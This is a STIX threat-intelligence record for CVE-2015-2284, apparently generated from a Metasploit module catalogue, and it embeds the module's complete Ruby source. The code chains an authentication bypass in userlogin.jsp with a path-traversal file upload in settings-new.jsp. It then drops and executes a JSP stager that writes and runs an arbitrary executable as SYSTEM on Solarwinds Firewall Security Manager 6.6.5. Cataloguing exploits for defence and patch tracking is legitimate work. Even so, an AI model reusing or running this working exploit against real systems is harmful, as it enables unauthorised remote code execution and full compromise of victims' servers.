{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5783dcc8-0515-43a1-a986-a71c72ff72d4",
    "created": "2024-08-14T16:54:41.243409Z",
    "modified": "2024-08-14T16:54:41.243413Z",
    "name": "\"Solarwinds Firewall Security Manager 6.6.5 Client Session Handling Vulnerability\"",
    "description": " This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager 6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set the 'username' attribute before authentication. The second problem is that the settings-new.jsp file will only check the 'username' attribute before authorizing the 'uploadFile' action which can be exploited and allows the attacker to upload a fake xls host list file to the server, and results in arbitrary code execution under the context of SYSTEM.  Depending on the installation, by default the Change Advisor web server is listening on port 48080 for an express install. Otherwise, this service may appear on port 8080.  Solarwinds has released a fix for this vulnerability as FSM-v6.6.5-HotFix1.zip, noted in the references for this module.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/solarwinds_fsm_userlogin.rb",
            "external_id": "solarwinds_fsm_userlogin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-2284"
        },
        {
            "source_name": "reference",
            "url": "http://downloads.solarwinds.com/solarwinds/Release/HotFix/FSM-v6.6.5-HotFix1.zip"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Solarwinds Firewall Security Manager 6.6.5 Client Session Handling Vulnerability\",\n      'Description'    => %q{\n        This module exploits multiple vulnerabilities found in Solarwinds Firewall Security Manager\n        6.6.5. The first vulnerability is an authentication bypass via the Change Advisor interface\n        due to a user-controlled session.putValue API in userlogin.jsp, allowing the attacker to set\n        the 'username' attribute before authentication. The second problem is that the settings-new.jsp\n        file will only check the 'username' attribute before authorizing the 'uploadFile' action,\n        which can be exploited and allows the attacker to upload a fake xls host list file to the\n        server, and results in arbitrary code execution under the context of SYSTEM.\n\n        Depending on the installation, by default the Change Advisor web server is listening on port\n        48080 for an express install. Otherwise, this service may appear on port 8080.\n\n        Solarwinds has released a fix for this vulnerability as FSM-v6.6.5-HotFix1.zip, noted in the\n        references for this module.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod',  # Original discovery\n          'mr_me <steventhomasseeley[at]gmail.com>', # https://twitter.com/ae0n_\n          'sinn3r' # Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2015-2284'],\n          ['OSVDB', '81634'],\n          ['ZDI', '15-107'],\n          ['URL', 'http://downloads.solarwinds.com/solarwinds/Release/HotFix/FSM-v6.6.5-HotFix1.zip']\n        ],\n      'DefaultOptions'  =>\n        {\n          'RPORT'    => 48080 # Could be 8080 too\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Solarwinds Firewall Security Manager 6.6.5', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-03-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, 'Base FMS directory path', '/'])\n      ])\n  end\n\n\n  # Returns a checkcode that indicates whether the target is FSM or not\n  def check\n    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'fsm', 'login.jsp'))\n\n    if res && res.body =~ /SolarWinds FSM Change Advisor/i\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n\n  # Exploit/run command\n  def exploit\n    unless check == Exploit::CheckCode::Detected\n      fail_with(Failure::NotVulnerable, 'Target does not appear to be a Solarwinds Firewall Security Manager')\n    end\n\n    # Stage 1 of the attack\n    # 'admin' is there by default and you can't delete it\n    username = 'admin'\n    print_status(\"Auth bypass: Putting session value: username=#{username}\")\n    sid = put_session_value(username)\n    print_status(\"Your SID is: #{sid}\")\n\n    # Stage 2 of the attack\n    exe = generate_payload_exe(code: payload.encoded)\n    filename = \"#{Rex::Text.rand_text_alpha(5)}.jsp\"\n    # Because when we get a shell, we will be at:\n    # C:\\Program Files\\SolarWinds\\SolarWinds FSMServer\\webservice\n    # So we have to adjust this filename in order to delete the file\n    register_files_for_cleanup(\"../plugins/com.lisletech.athena.http.servlets_1.2/jsp/#{filename}\")\n    malicious_file = get_jsp_payload(exe, filename)\n    print_status(\"Uploading file: #{filename} (#{exe.length} bytes)\")\n    upload_exec(sid, filename, malicious_file)\n  end\n\n\n  private\n\n\n  # Returns a write-stager\n  # I grabbed this from Juan's sonicwall_gms_uploaded.rb module\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  # Returns JSP that executes stuff\n  # This is also from Juan's sonicwall_gms_uploaded.rb module\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n\n  # Returns a JSP payload\n  def get_jsp_payload(exe, output_file)\n    jsp_drop_bin(exe, output_file) + jsp_execute_command(output_file)\n  end\n\n\n  # Creates an arbitrary username by abusing the server's unsafe use of session.putValue\n  def put_session_value(value)\n    res = send_request_cgi(\n      'uri'      => normalize_uri(target_uri.path, 'fsm', 'userlogin.jsp'),\n      'method'   => 'GET',\n      'vars_get' => { 'username' => value }\n    )\n\n    unless res\n      fail_with(Failure::Unknown, 'The connection timed out while setting the session value.')\n    end\n\n    get_sid(res)\n  end\n\n\n  # Returns the session ID\n  def get_sid(res)\n    cookies = res.get_cookies\n    sid = cookies.scan(/(JSESSIONID=\\w+);*/).flatten[0] || ''\n    sid\n  end\n\n\n  # Uploads a malicious file and then execute it\n  def upload_exec(sid, filename, malicious_file)\n    res = upload_file(sid, filename, malicious_file)\n\n    if !res\n      fail_with(Failure::Unknown, 'The connection timed out while uploading the malicious file.')\n    elsif res.body.include?('java.lang.NoClassDefFoundError')\n      print_good('Payload being treated as XLS, indicates a successful upload.')\n    else\n      print_bad('Unsure of a successful upload.')\n    end\n\n    print_status('Attempting to execute the payload.')\n    exec_file(sid, filename)\n  end\n\n\n  # Uploads a malicious file\n  # By default, the file will be saved at the following location:\n  # C:\\Program Files\\SolarWinds\\SolarWinds FSMServer\\plugins\\com.lisletech.athena.http.servlets_1.2\\reports\\tickets\\\n  def upload_file(sid, filename, malicious_file)\n    # Put our payload in:\n    # C:\\Program Files\\SolarWinds\\SolarWinds FSMServer\\plugins\\com.lisletech.athena.http.servlets_1.2\\jsp\\\n    filename = \"../../jsp/#{filename}\"\n\n    mime_data = Rex::MIME::Message.new\n    mime_data.add_part(malicious_file, 'application/vnd.ms-excel', nil, \"name=\\\"file\\\"; filename=\\\"#{filename}\\\"\")\n    mime_data.add_part('uploadFile', nil, nil, 'name=\"action\"')\n\n    proto = ssl ? 'https' : 'http'\n    ref = \"#{proto}://#{rhost}:#{rport}#{normalize_uri(target_uri.path, 'fsm', 'settings-new.jsp')}\"\n\n    send_request_cgi(\n      'uri'      => normalize_uri(target_uri.path, 'fsm', 'settings-new.jsp'),\n      'method'   => 'POST',\n      'vars_get' => { 'action' => 'uploadFile' },\n      'ctype'    => \"multipart/form-data; boundary=#{mime_data.bound}\",\n      'data'     => mime_data.to_s,\n      'cookie'   => sid,\n      'headers'  => { 'Referer' => ref }\n    )\n  end\n\n\n  # Executes the malicious file and get code execution\n  # We will be at this location:\n  # C:\\Program Files\\SolarWinds\\SolarWinds FSMServer\\webservice\n  def exec_file(sid, filename)\n    send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'fsm', filename)\n    )\n  end\n\n\n  # Overrides the original print_status so we make sure we print the rhost and port\n  def print_status(msg)\n    super(\"#{rhost}:#{rport} - #{msg}\")\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2015-03-13",
    "x_mitre_platforms": [
        "win'"
    ]
}